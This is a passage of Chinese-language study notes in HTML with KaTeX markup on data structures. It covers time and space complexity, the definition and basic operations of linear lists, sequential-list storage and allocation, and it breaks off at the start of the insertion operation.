<p><strong>常见的渐近时间复杂度为</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">!</mo><mo stretchy="false">)</mo><mo>&lt;</mo><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1) &lt; O(log_{2}n) &lt; O(n) &lt; O(nlog_{2}n) &lt; O(n^{2}) &lt; O(n^{3}) &lt; O(2^{n}) &lt; O(n!) &lt; O(n^{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">!)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p>
</li>
<li>
<p><strong>空间复杂度</strong></p>
<p>算法的空间复杂度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 定义为该算法所耗费的存储空间，它是问题规模 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的函数。记为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(n) = O(g(n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span></span></span></span></p>
<p>一个程序在执行时除需要存储空间来存放本身所用的指令、常数、变量和输入数据外，还需要一些对数据进行操作的工作单元和存储一些为实现计算所需信息的辅助空间。若输入数据所占空间只取决于问题本身，和算法无关，则只需分析除输入和程序之外的额外空间。</p>
<p>算法原地工作是指算法所需的辅助空间为常量，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p>
</li>
</ol>
<h2> 线性表</h2>
<h3> 线性表的定义和基本操作</h3>
<h4> 线性表的定义</h4>
<p>线性表是 <strong>具有相同数据类型的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⩾</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n (n \geqslant 0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> 个数据元素的有限序列</strong>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为表长，当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">n = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 时线性表是一个空表。若用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 命名线性表，则其一般表示为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L = (a_{1}, a_{2}, a_{i+1}, \dotsc, a_{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是唯一的 “第一个” 数据元素，又称 <strong>表头元素</strong>；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是唯一的 “最后一个” 数据元素，又称 <strong>表尾元素</strong>。除第一个元素外，每个元素有且仅有一个直接前驱。除最后言个元素外，每个元素有且仅有一个直接后继（“直接前驱” 和 “前驱”、“直接后继” 和 “后继” 通常被视为同义词）。以上就是线性表的逻辑特性，这种线性有序的逻辑结构正是线性表名字的由来。</p>
<p><strong>线性表的特点如下：</strong></p>
<ul>
<li>表中元素的个数有限</li>
<li>表中元素具有逻辑上的顺序性，表中元素有其先后次序</li>
<li>表中元素都是数据元素，每个元素都是单个元素</li>
<li>表中元素的数据类型都相同，这意味着每个元素占有相同大小的存储空间</li>
<li>表中元素具有抽象性，即仅讨论元素间的逻辑关系，而不考虑元素究竟表示什么内容</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>线性表是一种逻辑结构，表示元素之间一对一的相邻关系。顺序表和链表是指存储结构，两者属于不同层面的概念，因此不要将其混淆</p>
</div>
<h4> 线性表的基本操作</h4>
<p>一个数据结构的基本操作是指 <strong>其最核心、最基本的操作</strong>。其他较复杂的操作可通过调用其基本操作来实现。<strong>线性表的主要操作如下：</strong></p>
<ul>
<li><strong>InitList(&amp;L)</strong>：初始化表。构造一个空的线性表</li>
<li><strong>Length(L)</strong>：求表长。返回线性表 <code>L</code> 的长度，即 <code>L</code> 中数据元素的个数</li>
<li><strong>LocateElem(L, e)</strong>：按值查找操作。在表 <code>L</code> 中查找具有给定关键字值的元素</li>
<li><strong>GetElem(L, i)</strong>：按位查找操作。获取表 <code>L</code> 中第 <code>i</code> 个位置的元素的值</li>
<li><strong>ListInsert(&amp;L, i, e)</strong>：插入操作。在表 <code>L</code> 中的第 <code>i</code> 个位置上插入指定元素 <code>e</code></li>
<li><strong>ListDelete(&amp;L, i, &amp;e)</strong>：删除操作。删除表 <code>L</code> 中第 <code>i</code> 个位置的元素，并用 <code>e</code> 返回删除元素的值</li>
<li><strong>PrintList(L)</strong>：输出操作。按前后顺序输出线性表 <code>L</code> 的所有元素值</li>
<li><strong>Empty(L)</strong>：判空操作。若 <code>L</code> 为空表，则返回 <code>true</code>，否则返回 <code>false</code></li>
<li><strong>DestroyList(&amp;L)</strong>：销毁操作。销毁线性表，并释放线性表 <code>L</code> 所占用的内存空间</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<ul>
<li>基本操作的实现取决于采用哪种存储结构，存储结构不同，算法的实现也不同</li>
<li>符号 “&amp;” 表示 C++ 语言中的引用调用，在 C 语言中采用指针也可达到同样的效果</li>
</ul>
</div>
<h3> 线性表的顺序表示</h3>
<h4> 顺序表的定义</h4>
<p>线性表的顺序存储又称顺序表。它是用一组地址连续的存储单元依次存储线性表中的数据元素，从而使得逻辑上相邻的两个元素在物理位置上也相邻。第 <code>1</code> 个元素存储在线性表的起始位置，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个元素的存储位置后面紧接着存储的是第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 个元素，称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 为元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 在线性表中的位序。因此，<strong>顺序表的特点是表中元素的逻辑顺序与其物理顺序相同。</strong></p>
<p>假设线性表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 存储的起始位置为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">LOC(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span> LOC 是 <code>location</code> 的缩写，sizeof（ElemType）是每个数据元素所占用存储空间的大小，则表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 所对应的顺序存储如下表所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">数组下标</th>
<th style="text-align:center">顺序表</th>
<th style="text-align:center">内存地址</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">a<sub>1</sub></td>
<td style="text-align:center">LOC(A)</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">a<sub>2</sub></td>
<td style="text-align:center">LOC(A) + sizeof(ElemType)</td>
</tr>
<tr>
<td style="text-align:center">i - 1</td>
<td style="text-align:center">a<sub>i</sub></td>
<td style="text-align:center">LOC(A) + (i-1) x sizeof(ElemType)</td>
</tr>
<tr>
<td style="text-align:center">n - 1</td>
<td style="text-align:center">a<sub>n</sub></td>
<td style="text-align:center">LOC(A) + (n-1) x sizeof(ElemType)</td>
</tr>
<tr>
<td style="text-align:center">MaxSize - 1</td>
<td style="text-align:center">...</td>
<td style="text-align:center">LOC(A) + (MaxSize - 1) x sizeof(ElemType)</td>
</tr>
</tbody>
</table>
<p>每个数据元素的存储位置都和线性表的起始位置相差一个和该数据元素的位序成正比的常数，因此，顺序表中的任意一个数据元素都可以随机存取，所以线性表的顺序存储结构是一种随机存取的存储结构。通常用高级程序设计语言中的数组来描述线性表的顺序存储结构。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>线性表中元素的位序是从 <code>1</code> 开始的，而数组中元素的下标是从 <code>0</code> 开始的</p>
</div>
<p>假定线性表的元素类型为 ElemType，则线性表的顺序存储类型描述为：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>一维数组可以是静态分配的，也可以是动态分配的。在静态分配时，由于数组的大小和空间事先已经固定，一旦空间占满，再加入新的数据就会产生溢出，进而导致程序崩溃。</p>
<p>而在动态分配时，存储数组的空间是在程序执行过程中通过动态存储分配语句分配的，一旦数据空间占满，就另外开辟一块更大的存储空间，用以替换原来的存储空间，从而达到扩充存储数组空间的目的，而不需要为线性表一次性地划分所有空间。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>C 的初始动态分配语句为：<code>L.data = (ElemType *)malloc(sizeof(ElemType) * InitSize);</code></p>
<p>C++ 的初始动态分配语句为：<code>L.data = new ElemType[InitSize];</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>动态分配并不是链式存储，它同样属于顺序存储结构，物理结构没有变化，依然是随机存取方式，只是分配的空间大小可以在运行时动态决定</p>
</div>
<p>顺序表最主要的特点是随机访问，即通过首地址和元素序号可在时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 内找到指定的元素。</p>
<p>顺序表的存储密度高，每个结点只存储数据元素。</p>
<p>顺序表逻辑上相邻的元素物理上也相邻，所以插入和删除操作需要移动大量元素。</p>
<h4> 顺序表上基本操作的实现</h4>
<ol>
<li>
<p><strong>插入操作</strong></p>
<p>在顺序表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo stretchy="false">(</mo><mn>1</mn><mo>⩽</mo><mi>i</mi><mo>⩽</mo><mi>L</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i (1 \leqslant i \leqslant L.length + 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7962em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">L</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 个位置插入新元素 <code>e</code>。若 <code>i</code> 的输入不合法，则返回 <code>false</code>，表示插入失败；否则，将第 <code>i</code> 个元素及其后的所有元素依次往后移动一个位置，腾出一个空位置插入新元素 <code>e</code>，顺序表长度增加 <code>1</code>，插入成功，返回 <code>true</code>。</p>
